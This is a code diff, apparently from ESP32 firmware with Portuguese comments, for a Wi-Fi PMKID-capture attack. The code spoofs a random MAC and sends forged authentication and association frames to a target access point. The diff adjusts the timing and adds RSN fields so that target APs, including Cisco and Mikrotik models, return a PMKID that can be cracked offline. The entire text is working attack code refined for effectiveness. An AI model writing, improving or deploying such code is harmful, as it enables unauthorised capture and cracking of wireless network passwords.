@@ -88,9 +88,9 @@ public:
                 fakeMac[0] = (fakeMac[0] | 0x02) & 0xFE;
 
                 esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
-                delayMicroseconds(2000);
+                delay(15); // aguarda rádio estabilizar no canal antes de transmitir
                 _sendAuthRequest(t.bssid, fakeMac);
-                delayMicroseconds(8000);
+                delay(12);
                 _sendAssocRequest(t.bssid, fakeMac, t.ssid);
 
                 t.attempts++;
@@ -162,15 +162,18 @@ private:
         static const uint8_t extRates[] = {0x32,0x04,0x30,0x48,0x60,0x6C};
         memcpy(buf + pos, extRates, sizeof(extRates)); pos += sizeof(extRates);
 
-        // RSN IE (WPA2-PSK CCMP) — essencial para AP enviar EAPOL M1
+        // RSN IE (WPA2-PSK CCMP) — essencial para AP enviar EAPOL M1 com PMKID
+        // PMKIDCount=0 obrigatório: APs Cisco/Mikrotik rejeitam sem este campo
         static const uint8_t rsn[] = {
-            0x30, 0x12,             // RSN IE, len=18
+            0x30, 0x16,             // RSN IE tag=0x30, len=22
             0x01, 0x00,             // Version 1
-            0x00, 0x0F, 0xAC, 0x04, // Group: CCMP
-            0x01, 0x00,             // 1 pairwise
+            0x00, 0x0F, 0xAC, 0x04, // Group cipher: CCMP
+            0x01, 0x00,             // Pairwise count: 1
             0x00, 0x0F, 0xAC, 0x04, // Pairwise: CCMP
-            0x01, 0x00,             // 1 AKM
+            0x01, 0x00,             // AKM count: 1
             0x00, 0x0F, 0xAC, 0x02, // AKM: PSK
+            0x00, 0x00,             // RSN Capabilities: 0 (sem PMF, sem 11w)
+            0x00, 0x00,             // PMKIDCount: 0 (pede ao AP que inclua PMKID no M1)
         };
         memcpy(buf + pos, rsn, sizeof(rsn)); pos += sizeof(rsn);
 
